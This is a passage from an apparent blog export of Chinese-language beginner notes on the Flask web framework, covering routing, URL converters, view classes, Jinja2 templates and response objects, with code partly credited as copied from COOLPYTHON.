    <url>/2023/07/03/2023-7-3-Flask-1/</url>
    <content><![CDATA[<h1 id="什么是Flask"><a href="#什么是Flask" class="headerlink" title="什么是Flask?"></a>什么是Flask?</h1><p>  Flask是一个使用 <a href="https://baike.baidu.com/item/Python?fromModule=lemma_inlink">Python</a> 编写的轻量级 Web 应用框架。其 <a href="https://baike.baidu.com/item/WSGI?fromModule=lemma_inlink">WSGI</a> 工具箱采用 Werkzeug ，<a href="https://baike.baidu.com/item/%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E/907667?fromModule=lemma_inlink">模板引擎</a>则使用 Jinja2 。Flask使用 BSD 授权。</p>
<p>​																																										——百度百科</p>
<p>如果看文章的你也同我一样，如此小白，便会觉得，听不懂。</p>
<p>什么是Web应用框架？</p>
<p>WSGI是什么？</p>
<p>模板引擎又是什么？</p>
<p>疑问很多，下面我将通过我的个人理解首先解答第一个问题。</p>
<h2 id="Web应用框架"><a href="#Web应用框架" class="headerlink" title="Web应用框架"></a>Web应用框架</h2><p>在接触Python之前我便对tomcat , Djongo 等，略有耳闻。这是两种知名的，Web应用框架。在实际操作之前，仅凭想象，或是其他渠道学习，理解总归是差些的。</p>
<p>Web应用框架，说白了，就是可以通过编写代码，实现一个运行在Web上的应用程序。什么是Web应用程序，即能通过Web访问，也就是HTTP或HTTPS访问使用的应用。</p>
<p>再通俗点讲，就是实现了网站的网页和网站的部署。实现了html和web服务器的功能。</p>
<h2 id="瞬间上手Flask"><a href="#瞬间上手Flask" class="headerlink" title="瞬间上手Flask"></a>瞬间上手Flask</h2><p>首先，我们先来安装一下Flask，只需要一条代码即可。（默认你电脑上有Python和pip）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip install flask</span><br></pre></td></tr></table></figure>

<p>然后，打开你的IDE，编写一段超级精简的Python代码！</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># __name__是python的一个内置类属性,它存储模块的名称。 python的模块既可以被调用,也可以独立运行。</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>) </span><span class="comment"># 这是一个装饰器</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 用来装饰函数hello_world，当请求的path 是 / 时，程序用函数hello_world来处理这个请求</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello World!&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>

<p>点击运行，得到以下输出。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">* Running on http://127.0.0.1:5000/ (Press CTRL+C to quit)</span><br></pre></td></tr></table></figure>

<p>然后访问其中的地址，即可得到一个网页。</p>
<p>网页中只有一行字，Hello World。本来这博文也是写给自己看的，就不多赘述了。</p>
<h2 id="name"><a href="#name" class="headerlink" title="name"></a><strong>name</strong></h2><p>不得不说一下  <code>__name__</code> 这玩意，比较的神奇。</p>
<p>如果不在本文件运行这个属性，它返回的值是文件名，但当在本文件运行时，它返回的值是 <code>__main__</code>。</p>
<h2 id="装饰器"><a href="#装饰器" class="headerlink" title="装饰器"></a>装饰器</h2><p>装饰器以 @ 开头 ，用以装饰后面的函数。</p>
<h2 id="app-run"><a href="#app-run" class="headerlink" title="app.run"></a>app.run</h2><p>我们可以指定监听的地址和端口，如：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">1122</span>)</span><br></pre></td></tr></table></figure>





<h1 id="Flask路由"><a href="#Flask路由" class="headerlink" title="Flask路由"></a>Flask路由</h1><p>在讲解最小的flask应用时，提到了装饰器route，它的作用就是将处理请求的函数绑定到URL上（URL必须以反斜杠开头），这种设计体现了解耦的思想。
 <img src="http://www.coolpython.net/pictures/flask_tutorial/basic/route-1586299659-0.jpg" alt="img">
 不同的请求被路由到不同处理函数上，这个函数称之为视图。路由保存了URL和处理函数之间的映射关系，映射关系的建立是通过route装饰器完成的。</p>
<p>​																																							  ——COOLPython</p>
<h2 id="建立映射关系"><a href="#建立映射关系" class="headerlink" title="建立映射关系"></a>建立映射关系</h2><p>通过route装饰器，不同的请求被路由到不同处理函数上。路由保存了URL和处理函数之间的映射关系。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hello&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;hello&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/books&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">books</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;books&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<h2 id="变量规则"><a href="#变量规则" class="headerlink" title="变量规则"></a>变量规则</h2><p>实例中，无论是 <code>/hello</code> 还是 <code>/books/</code> 这种URL都是固定的，而在实际使用中，经常会用到不固定的URL。如：</p>
<blockquote><p>比如&#x2F;book&#x2F;1&#x2F;price 这种restful风格的URL。</p>
<footer><strong>@COOLPYTHON</strong><cite><a href="http://www.coolpython.net/flask_tutorial/basic/route.html">www.coolpython.net/flask_tutorial/basic/route.html</a></cite></footer></blockquote>

<p>先不谈什么是restful风格，当务之急是我们需要实现一个动态变化的URL。</p>
<p>而Flask自带实现方法，允许给URL添加变量部分。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/book/&lt;int:id&gt;/price&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">price</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(<span class="built_in">id</span>)</span><br></pre></td></tr></table></figure>

<p>变量部分的规则为 <a href="converter:variable_name">converter:variable_name</a> ,variable_name将作为参数传递给所绑定的函数，而且可以根据converter转换器对variable_name进行转换。</p>
<p>converter转换器有下面几种</p>
<p>| 转换器 | 说明             |
| —— | —————- |
| int    | 接受整数         |
| float  | 接受浮点数       |
| path   | 接受带斜线的path |</p>
<p>如果不标注转换器类型，则默认转为字符串，下面是这几种转换器的例子</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 不指定转换器</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/book/&lt;name&gt;/author&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">author</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="keyword">return</span> name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 转换器为int</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/book/&lt;int:id&gt;/price&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">price</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(<span class="built_in">id</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 转换器为float</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/book/price-ge/&lt;float:price&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">books_by_price</span>(<span class="params">price</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(price)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 转换器为path</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/book/&lt;path:book_info&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">books_by_path</span>(<span class="params">book_info</span>):</span><br><span class="line">    <span class="keyword">return</span> book_info</span><br></pre></td></tr></table></figure>

<p>​																																							——COOLPYTHON</p>
<h2 id="感想"><a href="#感想" class="headerlink" title="感想"></a>感想</h2><p>初见，Suki , 结婚！</p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Flask</tag>
      </tags>
  </entry>
  <entry>
    <title>Flask[相识]</title>
    <url>/2023/07/03/2023-7-3-Flask-2/</url>
    <content><![CDATA[<h2 id="路由规则管理"><a href="#路由规则管理" class="headerlink" title="路由规则管理"></a>路由规则管理</h2><p>一般情况有两种添加路由规则的方式</p>
<p>1、使用route添加路由规则</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/add_url&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_rule</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;add url rule&#x27;</span></span><br></pre></td></tr></table></figure>

<p>2、使用add_url_rule添加路由规则</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add_rule</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;add url rule&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.add_url_rule(<span class="string">&#x27;/add_url&#x27;</span>, <span class="string">&#x27;add_rule&#x27;</span>, add_rule)</span><br></pre></td></tr></table></figure>

<p>两种方式的结果是相同的，route装饰器中也是调用了 add_url_rule方法添加路由规则。</p>
<blockquote><p>更深层的学习可以参考todo。</p>
<footer><strong>@COOLPYTHON</strong><cite><a href="http://www.coolpython.net/flask_tutorial/basic/route.html">www.coolpython.net/flask_tutorial/basic/route.html</a></cite></footer></blockquote>

<h2 id="设置method"><a href="#设置method" class="headerlink" title="设置method"></a>设置method</h2><p>一个URL可以用多种不同的方法请求，创建路由规则时，我们可以指定这个URL支持哪些请求方法。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/users&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">users</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;ok&#x27;</span></span><br></pre></td></tr></table></figure>

<p>在route装饰器中设置methods参数来决定支持的请求方法，不设置默认仅支持GET请求。</p>
<p>users函数既要处理GET请求，又要处理POST请求，那么如何区分它们呢？ 这就要用到请求对象request</p>
<p>通过获取requst的method属性，即可得到请求的方法。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/users&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">users</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;get&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;post&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;ok&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<h2 id="Flask视图"><a href="#Flask视图" class="headerlink" title="Flask视图"></a>Flask视图</h2><p>到底什么是视图呢？</p>
<h3 id="视图函数"><a href="#视图函数" class="headerlink" title="视图函数"></a>视图函数</h3><p>通过route装饰器，将url<code>/hello</code>与 函数<code>hello </code>关联在一起，我们称这个函数就是视图函数。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hello&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;hello&#x27;</span></span><br></pre></td></tr></table></figure>

<p>一个视图函数用来处理一个请求，最终返回数据。</p>
<h3 id="视图类"><a href="#视图类" class="headerlink" title="视图类"></a>视图类</h3><p>flask提供了两个两个视图类，我们可以继承这两个类中的一个，实现自己的类视图。</p>
<ol>
<li><p>flask.views.View</p>
<p> 继承flask.views.View，必须实现dispatch_request方法以处理请求，下面是一个简单的示例</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">from</span> flask.views <span class="keyword">import</span> View</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">UserView</span>(<span class="title class_ inherited__">View</span>):</span><br><span class="line">    methods = [<span class="string">&#x27;GET&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">dispatch_request</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(request.method)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;ok&#x27;</span></span><br><span class="line"></span><br><span class="line">app.add_url_rule(<span class="string">&#x27;/users&#x27;</span>, view_func=UserView.as_view(<span class="string">&#x27;users&#x27;</span>)) <span class="comment">#将函数绑定到Userview</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># userrView类中并没有名为 users 的方法，那么这个字符串参数意义何在呢？</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p> as_view方法返回的是一个View类里的一个方法，类里的方法本质上仍然是函数， methods 规定这个视图类可以处理的请求方法。</p>
<p> 这样设计，我们可以把处理请求的相关代码抽象成不同的方法写在UserView类里，这样便于管理。</p>
</li>
<li><p>flask.views.MethodView</p>
</li>
</ol>
<blockquote><p>View类里，如果一个资源支持多种请求方式，get，post,put,delete等等，那么你不得不在dispatch_request方法里根据request.method对他们进行区分，然后调用不同的处理方法进行响应，对各种请求的路由是由你自己完成的。</p>
<footer><strong>@COOLPYTHON</strong><cite><a href="http://www.coolpython.net/flask_tutorial/basic/route.html">www.coolpython.net/flask_tutorial/basic/route.html</a></cite></footer></blockquote>

<p>MethodView会自动的为视图类做好路由，不同的请求，会被路由到不同的处理方法上</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">from</span> flask.views <span class="keyword">import</span> MethodView</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">UserView</span>(<span class="title class_ inherited__">MethodView</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;收到get请求&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">post</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;收到post请求&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.add_url_rule(<span class="string">&#x27;/users&#x27;</span>, view_func=UserView.as_view(<span class="string">&#x27;users&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>此设计与tornado的处理方式相同，MethodView是View的子类，它实现了dispatch_request方法，若请求的get请求，则路由到get方法。</p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Flask</tag>
      </tags>
  </entry>
  <entry>
    <title>Flask[寻觅]</title>
    <url>/2023/07/04/2023-7-4-Flask-4/</url>
    <content><![CDATA[<h1 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h1><h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><ol>
<li>HTML代码复用</li>
<li>网页内容动态显示</li>
</ol>
<blockquote><p>使用模板技术，可以将那些可共用的代码放在基础模板里，其他的网页可以继承这个基础模板，也可以用include的方式加载进来。</p>
<footer><strong>@COOLPYTHON</strong><cite><a href="http://www.coolpython.net/flask_tutorial/basic/route.html">www.coolpython.net/flask_tutorial/basic/route.html</a></cite></footer></blockquote>

<h3 id="Jinja2"><a href="#Jinja2" class="headerlink" title="Jinja2"></a>Jinja2</h3><p>使用Jinja2模板引擎，通过render_template函数返回一个html文件</p>
<p>这些html文件默认存储在项目根目录下的tempates文件夹中，这个目录是可以自定义的，创建Flask对象时，通过template_folder来设置。</p>
<blockquote><p>使用ajax技术，前端页面通过ajax向后端发送请求，后端返回用户的具体信息。使用模板，则可以不必使用ajax在前端请求数据，在使用render_template返回html时，会将用户的信息一起返回，由模板引擎根据用户的信息对html进行渲染，以达到相同的效果。</p>
<footer><strong>@COOLPYTHON</strong><cite><a href="http://www.coolpython.net/flask_tutorial/basic/route.html">www.coolpython.net/flask_tutorial/basic/route.html</a></cite></footer></blockquote>

<h2 id="后端数据展示"><a href="#后端数据展示" class="headerlink" title="后端数据展示"></a>后端数据展示</h2><p>后端的数据放到前端展示，下面是项目的结构示意</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">flask_demo/</span><br><span class="line">├── __init__.py</span><br><span class="line">├── app.py</span><br><span class="line">└── templates</span><br><span class="line">    └── welcome.html</span><br></pre></td></tr></table></figure>

<p>app.py 的内容</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/welcome&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">welcome</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;welcome.html&#x27;</span>, name=<span class="string">&#x27;小明&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.run(port=<span class="number">5500</span>)</span><br></pre></td></tr></table></figure>

<p>welcome.html的内容</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>北京欢迎你<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>北京欢迎你,<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="响应对象"><a href="#响应对象" class="headerlink" title="响应对象"></a>响应对象</h2><p>是几个常见的视图返回数据的方式</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, jsonify, render_template, Response</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/text&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_text</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;返回文本&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/dict&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_dict</span>():</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;state&#x27;</span>: <span class="number">0</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/json&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_json</span>():</span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;state&#x27;</span>: <span class="number">0</span>&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/html&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_html</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/response&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_resonponse</span>():</span><br><span class="line">    <span class="keyword">return</span> Response(<span class="string">&#x27;Not Found&#x27;</span>, status=<span class="number">404</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(port=<span class="number">5566</span>)</span><br></pre></td></tr></table></figure>

<ol>
<li>get_text 返回一个字符串</li>
<li>get_dict 返回一个字典</li>
<li>get_json 返回一个json格式的字符串</li>
<li>get_html 返回一个模板</li>
<li>get_resonponse 返回一个Response对象</li>
</ol>
<blockquote><p>使用谷歌浏览器来查看这几个http响应的类型，1， 4， 5 的Content-Type 是  text&#x2F;html，2，3的Content-Type  是application&#x2F;json。这说明，flask会根据视图函数的返回值类型，来决定最终的Content-Type。</p>
<footer><strong>@COOLPYTHON</strong><cite><a href="http://www.coolpython.net/flask_tutorial/basic/route.html">www.coolpython.net/flask_tutorial/basic/route.html</a></cite></footer></blockquote>

<h3 id="Response"><a href="#Response" class="headerlink" title="Response"></a>Response</h3><p>Response是Flask中默认使用的响应对象</p>
<p>默认情况下设置为具有HTML mimetype。通常情况下，你不必自己创建这个对象，因为flask.flask.make_response会帮你处理这个问题。</p>
<p>如果你想替换所使用的响应对象，你可以将其子类化，并将 flask.flask.response_class设置为你的子类。</p>
<h2 id="1-make-response"><a href="#1-make-response" class="headerlink" title="1. make_response"></a>1. make_response</h2><p>视图函数的返回值，最终会传递给make_response方法，在该方法中，对返回值的类型进行判断，并根据返回值的不同做相应的处理</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">make_response</span>(<span class="params">self, rv</span>):</span><br><span class="line">    status = headers = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># unpack tuple returns</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(rv, <span class="built_in">tuple</span>):</span><br><span class="line">        len_rv = <span class="built_in">len</span>(rv)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># a 3-tuple is unpacked directly</span></span><br><span class="line">        <span class="keyword">if</span> len_rv == <span class="number">3</span>:</span><br><span class="line">            rv, status, headers = rv</span><br><span class="line">        <span class="comment"># decide if a 2-tuple has status or headers</span></span><br><span class="line">        <span class="keyword">elif</span> len_rv == <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">isinstance</span>(rv[<span class="number">1</span>], (Headers, <span class="built_in">dict</span>, <span class="built_in">tuple</span>, <span class="built_in">list</span>)):</span><br><span class="line">                rv, headers = rv</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                rv, status = rv</span><br><span class="line">        <span class="comment"># other sized tuples are not allowed</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> TypeError(</span><br><span class="line">                <span class="string">&quot;The view function did not return a valid response tuple.&quot;</span></span><br><span class="line">                <span class="string">&quot; The tuple must have the form (body, status, headers),&quot;</span></span><br><span class="line">                <span class="string">&quot; (body, status), or (body, headers).&quot;</span></span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">    <span class="comment"># the body must not be None</span></span><br><span class="line">    <span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">raise</span> TypeError(</span><br><span class="line">            <span class="string">&quot;The view function did not return a valid response. The&quot;</span></span><br><span class="line">            <span class="string">&quot; function either returned None or ended without a return&quot;</span></span><br><span class="line">            <span class="string">&quot; statement.&quot;</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    <span class="comment"># make sure the body is an instance of the response class</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(rv, self.response_class):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(rv, (text_type, <span class="built_in">bytes</span>, <span class="built_in">bytearray</span>)):</span><br><span class="line">            <span class="comment"># let the response class set the status and headers instead of</span></span><br><span class="line">            <span class="comment"># waiting to do it manually, so that the class can handle any</span></span><br><span class="line">            <span class="comment"># special logic</span></span><br><span class="line">            rv = self.response_class(rv, status=status, headers=headers)</span><br><span class="line">            status = headers = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">isinstance</span>(rv, <span class="built_in">dict</span>):</span><br><span class="line">            rv = jsonify(rv)</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">isinstance</span>(rv, BaseResponse) <span class="keyword">or</span> <span class="built_in">callable</span>(rv):</span><br><span class="line">            <span class="comment"># evaluate a WSGI callable, or coerce a different response</span></span><br><span class="line">            <span class="comment"># class to the correct type</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                rv = self.response_class.force_type(rv, request.environ)</span><br><span class="line">            <span class="keyword">except</span> TypeError <span class="keyword">as</span> e:</span><br><span class="line">                new_error = TypeError(</span><br><span class="line">                    <span class="string">&quot;&#123;e&#125;\nThe view function did not return a valid&quot;</span></span><br><span class="line">                    <span class="string">&quot; response. The return type must be a string, dict, tuple,&quot;</span></span><br><span class="line">                    <span class="string">&quot; Response instance, or WSGI callable, but it was a&quot;</span></span><br><span class="line">                    <span class="string">&quot; &#123;rv.__class__.__name__&#125;.&quot;</span>.<span class="built_in">format</span>(e=e, rv=rv)</span><br><span class="line">                )</span><br><span class="line">                reraise(TypeError, new_error, sys.exc_info()[<span class="number">2</span>])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> TypeError(</span><br><span class="line">                <span class="string">&quot;The view function did not return a valid&quot;</span></span><br><span class="line">                <span class="string">&quot; response. The return type must be a string, dict, tuple,&quot;</span></span><br><span class="line">                <span class="string">&quot; Response instance, or WSGI callable, but it was a&quot;</span></span><br><span class="line">                <span class="string">&quot; &#123;rv.__class__.__name__&#125;.&quot;</span>.<span class="built_in">format</span>(rv=rv)</span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">    <span class="comment"># prefer the status if it was provided</span></span><br><span class="line">    <span class="keyword">if</span> status <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(status, (text_type, <span class="built_in">bytes</span>, <span class="built_in">bytearray</span>)):</span><br><span class="line">            rv.status = status</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            rv.status_code = status</span><br><span class="line"></span><br><span class="line">    <span class="comment"># extend existing headers with provided headers</span></span><br><span class="line">    <span class="keyword">if</span> headers:</span><br><span class="line">        rv.headers.extend(headers)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> rv</span><br></pre></td></tr></table></figure>

<p>从上面的代码中可以看到，当视图返回一个字典时，flask会自动使用jsonify进行转换。通常情况下，我们不会在视图中直接返回Response对象，因为make_response会帮我们将返回值封装成Response。但如果你自己相对返回值进行特殊处理，那么直接返回Response对象是可行的，就像get_resonponse函数那样操作。</p>
<p>↑ 以上均复制自COOLPYTHON</p>
<h2 id="2-利用Response返回图片"><a href="#2-利用Response返回图片" class="headerlink" title="2. 利用Response返回图片"></a>2. 利用Response返回图片</h2><p>直接构造Response对象可以为接口返回图片数据</p>
